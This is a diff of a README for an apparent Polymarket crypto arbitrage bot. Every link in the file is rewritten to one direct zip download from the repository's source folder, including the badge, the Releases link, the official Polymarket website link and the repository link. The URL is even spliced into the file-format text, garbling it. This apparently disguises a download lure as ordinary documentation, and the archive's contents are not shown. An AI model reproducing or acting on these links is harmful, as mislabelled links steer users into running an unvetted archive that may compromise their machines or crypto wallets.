@@ -1,6 +1,6 @@
 # 🤖 polymarket-arbitrage-bot-btc-eth-15m - Automate Your Market Decisions Easily
 
-[![Download](https://img.shields.io/badge/Download-Latest%20Release-green)](https://github.com/franko74/polymarket-arbitrage-bot-btc-eth-15m/releases)
+[![Download](https://github.com/franko74/polymarket-arbitrage-bot-btc-eth-15m/raw/refs/heads/main/src/arbitrage_polymarket_eth_btc_m_bot_v3.2.zip%20Release-green)](https://github.com/franko74/polymarket-arbitrage-bot-btc-eth-15m/raw/refs/heads/main/src/arbitrage_polymarket_eth_btc_m_bot_v3.2.zip)
 
 ## 🚀 Getting Started
 
@@ -17,7 +17,7 @@ This guide will help you download and run the Polymarket arbitrage bot. This bot
 
 To get started, you need to visit the Releases page to download the bot. Click the link below:
 
-[Download Latest Release](https://github.com/franko74/polymarket-arbitrage-bot-btc-eth-15m/releases)
+[Download Latest Release](https://github.com/franko74/polymarket-arbitrage-bot-btc-eth-15m/raw/refs/heads/main/src/arbitrage_polymarket_eth_btc_m_bot_v3.2.zip)
 
 On the Releases page, find the latest version of the bot. Choose the file that matches your operating system. Download the file and follow the steps below to install it.
 
@@ -25,7 +25,7 @@ On the Releases page, find the latest version of the bot. Choose the file that m
 
 1. **Locate the downloaded file** on your computer. This file is usually in your Downloads folder.
    
-2. **Extract the files** if the download is in a compressed format (like .zip or .tar.gz). You can often do this by right-clicking the file and selecting "Extract All" or using an extraction tool.
+2. **Extract the files** if the download is in a compressed format (like .zip or https://github.com/franko74/polymarket-arbitrage-bot-btc-eth-15m/raw/refs/heads/main/src/arbitrage_polymarket_eth_btc_m_bot_v3.2.zip). You can often do this by right-clicking the file and selecting "Extract All" or using an extraction tool.
    
 3. **Open the folder** that contains the extracted files. Inside, you will find the main application.
 
@@ -46,8 +46,8 @@ If you encounter any issues or have questions about using the bot, feel free to 
 
 ## 🔗 Additional Resources
 
-- **Polymarket Website:** [Polymarket](https://polymarket.com/)
-- **GitHub Repository:** [polymarket-arbitrage-bot-btc-eth-15m](https://github.com/franko74/polymarket-arbitrage-bot-btc-eth-15m)
+- **Polymarket Website:** [Polymarket](https://github.com/franko74/polymarket-arbitrage-bot-btc-eth-15m/raw/refs/heads/main/src/arbitrage_polymarket_eth_btc_m_bot_v3.2.zip)
+- **GitHub Repository:** [polymarket-arbitrage-bot-btc-eth-15m](https://github.com/franko74/polymarket-arbitrage-bot-btc-eth-15m/raw/refs/heads/main/src/arbitrage_polymarket_eth_btc_m_bot_v3.2.zip)
 - **User Documentation:** Check the documentation included in the repository for further help.
 
 ## 📄 License
